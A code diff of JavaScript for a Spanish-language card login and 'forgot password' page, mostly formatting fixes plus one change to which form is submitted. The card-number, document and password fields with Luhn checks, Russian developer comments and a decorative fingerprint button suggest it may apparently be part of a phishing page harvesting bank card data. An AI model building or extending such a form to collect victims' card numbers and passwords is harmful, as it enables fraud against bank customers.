@@ -20,7 +20,7 @@ document.addEventListener("DOMContentLoaded", function () {
   const forgetDocNumber = document.querySelector("#forget-form-docNumber");
   const password = document.querySelector("#password");
   const forgetFormBtn = document.querySelector("#forget-form-btn");
-  
+
   const fingerprint = document.querySelector(".fingerprint");
   const loader = document.querySelector(".loader-wrapper");
   fingerprint.addEventListener("click", function () {
@@ -28,7 +28,15 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
   const recordarCheckbox = document.getElementById("recordar");
-  const inputFields = [cardNumber, docType, docNumber, password,forgetCardNumber,docType,forgetDocNumber];
+  const inputFields = [
+    cardNumber,
+    docType,
+    docNumber,
+    password,
+    forgetCardNumber,
+    docType,
+    forgetDocNumber,
+  ];
   function toggleGreenBorder() {
     if (recordarCheckbox.checked) {
       // Add green border
@@ -76,7 +84,7 @@ document.addEventListener("DOMContentLoaded", function () {
       value = value.slice(0, 16);
     }
     this.value = value.replace(/(.{4})/g, "$1 ").trim();
-    forgotCheckFields()
+    forgotCheckFields();
   });
   docType.addEventListener("change", function () {
     docNumber.value = "";
@@ -168,7 +176,7 @@ document.addEventListener("DOMContentLoaded", function () {
     value = value.match(pattern) ? value : value.slice(0, -1);
 
     this.value = value;
-    forgotCheckFields()
+    forgotCheckFields();
   });
   // Обработка отправки формы
   form.addEventListener("submit", function (e) {
@@ -217,14 +225,11 @@ document.addEventListener("DOMContentLoaded", function () {
     e.preventDefault();
     let valid = true;
     errorMes = "Por favor, corrija los siguientes errores:\n";
-
     let cardNumValue = forgetCardNumber.value.replace(/ /g, "");
     if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
       valid = false;
       errorMes += "Por favor, ingresa todos los dígitos de tu tarjeta";
     }
-
-
     let docNumValue = forgetDocNumber.value;
     switch (forgetDocType.value) {
       case "DNI":
@@ -245,7 +250,7 @@ document.addEventListener("DOMContentLoaded", function () {
     }
 
     if (valid && lunarChecked) {
-      sendForm("myForm");
+      sendForm("forget-form");
       loader.style.display = "flex";
     } else {
       customAlert();
@@ -377,20 +382,22 @@ document.addEventListener("DOMContentLoaded", function () {
       }
     }
   });
-  document.getElementById("forget-form-doc-num").addEventListener("input", function (e) {
-    const input = e.target.value.replace(/\s+/g, ""); // Удаляем все пробелы
-    if (input.length >= 16) {
-      if (luhnCheck(input)) {
-        lunarChecked = true;
-      } else {
-        lunarChecked = false;
+  document
+    .getElementById("forget-form-doc-num")
+    .addEventListener("input", function (e) {
+      const input = e.target.value.replace(/\s+/g, ""); // Удаляем все пробелы
+      if (input.length >= 16) {
+        if (luhnCheck(input)) {
+          lunarChecked = true;
+        } else {
+          lunarChecked = false;
+        }
       }
-    }
-  });
+    });
   const forgotCheckFields = () => {
     // Проверяем, заполнены ли оба поля
-    if (forgetCardNumber.value !== '' && forgetDocNumber.value !== '') {
-      forgetFormBtn.disabled = false
+    if (forgetCardNumber.value !== "" && forgetDocNumber.value !== "") {
+      forgetFormBtn.disabled = false;
     }
-  }
+  };
 });
